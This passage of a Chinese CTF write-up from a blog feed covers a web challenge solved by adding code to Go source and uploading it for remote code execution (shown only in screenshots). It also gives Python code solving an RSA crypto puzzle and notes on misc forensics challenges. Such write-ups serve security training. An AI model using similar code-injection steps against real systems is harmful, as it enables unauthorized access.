data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/JASLbHR5yoeoraxNhQ1cwWBinaf.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/JASLbHR5yoeoraxNhQ1cwWBinaf.png"></p><p>下载其中文件</p><p>hints 中是源码，prodbucket 中是一个 update,跟 main 好像是一样的</p><p>查看源码，是一个 go 的项目，用了 gin,他只有一个路由，猜测是第一个靶机的源码</p><p>我们向其中添加代码</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/UGJRbaMNYok9GqxYtZBcjv7sncb.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/UGJRbaMNYok9GqxYtZBcjv7sncb.png"></p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/N3rZbf8RrouqgQx8Re1cfYIrnYk.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/N3rZbf8RrouqgQx8Re1cfYIrnYk.png"></p><p>上传</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/VvDxbKQLMo27lIxD36tcsFPNndf.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/VvDxbKQLMo27lIxD36tcsFPNndf.png"></p><p>Rce</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/D4mabhqoNoRi37xfxGycVAfunkc.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/D4mabhqoNoRi37xfxGycVAfunkc.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="c3-sieve"><a href="#c3-sieve" class="headerlink" title="c3 sieve"></a>c3 sieve</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">**结合题目给出的信息，采用两种筛法解出trick：** <br><span class="hljs-keyword">from</span> sage.all import prime_pi, next_prime, inverse_mod<br><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes<br>def <span class="hljs-title function_ invoke__">compute_sum_phi</span>(k):<br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    phi = <span class="hljs-keyword">list</span>(<span class="hljs-title function_ invoke__">range</span>(k + <span class="hljs-number">1</span>))<br>    sum_phi = <span class="hljs-number">1</span>  <span class="hljs-comment"># phi[1] = 1</span><br>    <span class="hljs-keyword">for</span> p in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">2</span>, k + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> phi[p] == p:  <span class="hljs-comment"># p是素数</span><br>            phi[p] = p - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> multiple in <span class="hljs-title function_ invoke__">range</span>(p*<span class="hljs-number">2</span>, k+<span class="hljs-number">1</span>, p):<br>                phi[multiple] -= phi[multiple] <span class="hljs-comment">// p</span><br>        sum_phi += phi[p]<br>    <span class="hljs-keyword">return</span> sum_phi<br>e = <span class="hljs-number">65537</span><br>k = (e ** <span class="hljs-number">2</span>) <span class="hljs-comment">// 6  # k = 715,870,206</span><br>enc = <span class="hljs-number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;计算欧拉函数前缀和...&quot;</span>)<br>sum_phi = <span class="hljs-title function_ invoke__">compute_sum_phi</span>(k)<br><span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;sum_phi = &#123;sum_phi&#125;&quot;</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;计算素数个数...&quot;</span>)<br>pi_k = <span class="hljs-title function_ invoke__">prime_pi</span>(k)<br><span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;pi_k = &#123;pi_k&#125;&quot;</span>)<br>T = sum_phi + pi_k<br><span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;trick(k) = &#123;T&#125;&quot;</span>)<br><br>**根据得到的值解rsa** ：<br><span class="hljs-keyword">from</span> Cryptodome.Util.number import long_to_bytes<br><span class="hljs-keyword">from</span> sympy import mod_inverse, nextprime<br>e = <span class="hljs-number">65537</span><br>enc = <span class="hljs-number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br>trick_result = <span class="hljs-number">155763335447735055</span><br>p = q = <span class="hljs-title function_ invoke__">nextprime</span>(trick_result &lt;&lt; <span class="hljs-number">128</span>)<br>n = p * q<br>phi_n = p  * (q - <span class="hljs-number">1</span>)<br>d = <span class="hljs-title function_ invoke__">pow</span>(e, -<span class="hljs-number">1</span>, phi_n)<br>m_decrypted = <span class="hljs-title function_ invoke__">pow</span>(enc, d, n)<br>decrypted_flag = <span class="hljs-title function_ invoke__">long_to_bytes</span>(m_decrypted)<br><span class="hljs-keyword">print</span>(decrypted_flag)<br></code></pre></td></tr></table></figure><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/NBiTbghHuoo1naxKYGMcD9z5nje.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/NBiTbghHuoo1naxKYGMcD9z5nje.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p><strong>Hakuya Want A Girl Friend</strong></p><p>下载附件，发现是存有 hex 值的文本，有 zip 和反过来的 png，分离并生成文件，zip 有密码，png 长度被修改过，修正后发现密码，得到 flag</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/WjhSbYRJDo3T8sxHPVqc7Q1bnxd.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/WjhSbYRJDo3T8sxHPVqc7Q1bnxd.png"></p><h3 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a><strong>Level 314 线性走廊中的双生实体</strong></h3><p>.pt 文件可以转为 zip，解压后看到代码，发现类中有 flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">import torch<br><br>model = torch.jit.<span class="hljs-title function_ invoke__">load</span>(<span class="hljs-string">&#x27;entity.pt&#x27;</span>, map_location=<span class="hljs-string">&#x27;cpu&#x27;</span>)<br><br><span class="hljs-comment"># 访问SecurityLayer实例</span><br>security_layer = model.security<br><br><span class="hljs-comment"># 提取flag列表并解码</span><br>flag_numbers = security_layer.flag<br>flag = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>([<span class="hljs-title function_ invoke__">chr</span>(c ^ <span class="hljs-number">85</span>) <span class="hljs-keyword">for</span> c in flag_numbers])<br><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/JLZ7bRhh5o9NyNxX0lycHVAXn6e.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/JLZ7bRhh5o9NyNxX0lycHVAXn6e.png"></p><h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a><strong>Computer cleaner</strong></h3><p>下载发现版本不对，修改文件将 21 改为 17，成功运行，进入后 document 中有 part3，</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/VTnFb7G4MoiDGrxBo3RcjrsAnXb.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/VTnFb7G4MoiDGrxBo3RcjrsAnXb.png"></p><p>简单溯源 121.41.34.25 访问得到 flag</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/QdCAbDO0AoWLocxFOeUcmXdLnMb.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/QdCAbDO0AoWLocxFOeUcmXdLnMb.png"></p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/NGUfbaZifoNK0cxQ3JLcedOcndd.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/NGUfbaZifoNK0cxQ3JLcedOcndd.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;&lt;del&gt;路边一条，一脚踹死&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;nc 那题直接连上就能执行 linux 指令&lt;/p&gt;
&lt;p class=&#39;item-</summary>
      
    
    
    
    
    <category term="CTF-WP" scheme="http://example.com/tags/CTF-WP/"/>
    
  </entry>
  
</feed>
